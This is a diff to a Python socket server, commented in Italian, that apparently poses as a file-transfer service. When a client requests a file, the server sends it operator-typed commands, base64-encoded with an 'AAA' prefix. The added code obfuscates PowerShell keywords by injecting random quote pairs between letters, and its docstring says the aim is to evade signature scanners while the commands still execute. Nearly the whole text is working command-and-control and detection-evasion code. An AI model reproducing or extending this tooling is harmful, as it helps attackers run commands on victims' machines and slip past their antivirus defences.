@@ -1,5 +1,7 @@
 import socket
 import base64
+import random
+import re
 
 # ============================================================
 #  CREDENZIALI - modificare qui username e password
@@ -34,6 +36,69 @@ def recv_line(sock: socket.socket) -> str:
     if line:
         debug_print(f"[C->S] {line}")
     return line
+
+
+def _insert_junk_between_chars(word: str) -> str:
+    """
+    Method 1 — Quote injection.
+    Inserts '' between letters of a PowerShell keyword so that the shell
+    still executes the command while confusing signature scanners.
+
+    Constraints:
+      - At most ONE separator is placed between any two adjacent characters
+        (prevents generating who''''ami).
+      - Between 1 and (len-1) positions are selected at random.
+
+    BUG FIX — only '' (single-quote pairs), never "" (double-quote pairs):
+    If "" were injected inside a keyword (e.g. St""art-Process), Pass 3 would
+    later misinterpret those double quotes as string delimiters and corrupt the
+    token into something like St""("art-P""roc")...  Using only '' avoids this
+    entirely because Pass 3 exclusively scans for double-quote delimited strings.
+    """
+    if len(word) <= 1:
+        return word
+
+    # FIX: single-quote pairs only — never double-quote pairs.
+    separators = ["''"]
+    chars = list(word)
+    max_insertions = len(chars) - 1
+    n_insertions = random.randint(1, max_insertions)
+
+    gap_indices = list(range(max_insertions))
+    insert_positions = set(random.sample(gap_indices, n_insertions))
+
+    result = [chars[0]]
+    for i in range(len(chars) - 1):
+        if i in insert_positions:
+            result.append(random.choice(separators))
+        result.append(chars[i + 1])
+
+    return "".join(result)
+
+
+def process_payload(payload_input):
+    """
+    Estrae il primo comando dal payload, lo passa alla funzione
+    _insert_junk_between_chars e ricostruisce la stringa.
+    """
+
+    # il comando deve iniziare con una lettera
+    pattern = r'^(\(*)\s*([A-Za-z][A-Za-z0-9_-]*)'
+
+    match = re.match(pattern, payload_input)
+    if not match:
+        return payload_input
+
+    command = match.group(2)
+
+    # elabora il comando
+    obfuscated = _insert_junk_between_chars(command)
+
+    # ricostruisce la stringa originale
+    start = match.start(2)
+    end = match.end(2)
+
+    return payload_input[:start] + obfuscated + payload_input[end:]
 
 
 def open_passive_server() -> socket.socket:
@@ -137,13 +202,18 @@ def handle_client_full(ctrl_sock: socket.socket) -> None:
         print(f"\n[SERVER] Il client vuole scaricare: {filename}")
         payload_input = input("[SERVER] Scrivi il payload (o QUIT per terminare): ").strip()
         quit_mode = payload_input.upper() == "QUIT"
-
+        # offuscamento comando
+        if quit_mode:
+           payload_input_quote=payload_input
+        else:
+           payload_input_quote = process_payload(payload_input)
+        print(f"\ncomando che sto per inviare: {payload_input_quote}")
 
         # >>>>>>>>>>>>>>>>>>>        
         # >>>>>>>>>>>>>>>>>>> DATI DA INVIARE CODIFICO: Codifico stringa da passare 
         # >>>>>>>>>>>>>>>>>>>          
         # 1. converti la stringa in bytes (UTF-8)
-        payload_bytes = payload_input.encode("utf-8")
+        payload_bytes = payload_input_quote.encode("utf-8")
         # 2. codifica in Base64
         payload_b64 = base64.b64encode(payload_bytes)
         # 3. aggiungi il prefisso AAA e converti di nuovo in stringa
